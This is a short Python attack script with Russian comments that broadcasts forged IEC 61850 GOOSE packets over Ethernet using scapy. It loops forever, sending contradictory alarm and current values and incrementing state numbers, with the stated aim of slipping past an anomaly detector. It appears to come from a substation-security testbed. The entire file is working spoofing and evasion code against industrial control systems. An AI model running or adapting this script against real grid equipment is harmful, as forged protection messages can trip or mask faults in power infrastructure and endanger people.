#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from goose_gen import build_goose_packet
from scapy.all import sendp

# === НАСТРОЙКИ (скопируй из conf.yaml и conf_rza.yaml) ===
src_mac = "02:0F:1E:3D:5C:7B"
dst_mac = "FF:FF:FF:FF:FF:FF"
iface = "eth0"
goCBRef =  "GOOSEControlBlock1"
datSet = "DataSet1"
goID = "GOOSE_ID_1"
confRev= 1

st_num = 1
sq_num = 1

print("[ATTACK] Запуск атаки 'Обход детектора'...")
while True:
    # Противоречивые данные: alarm=True, но current < 10 (порог аномалии)
    alarm_state = True
    current = 5
    voltage = 240
    power = 1

    all_data = [alarm_state, current, voltage, power]
    pkt = build_goose_packet(
        src_mac, dst_mac, st_num, sq_num,
        goCBRef, datSet, goID, confRev, all_data
    )
    sendp(pkt, iface=iface, verbose=False)
    print(f"[ATTACK] Отправлен противоречивый пакет: alarm={alarm_state}, current={current}A")

    if alarm_state:
        st_num += 1
        sq_num = 1
    else:
        sq_num += 1
    time.sleep(1)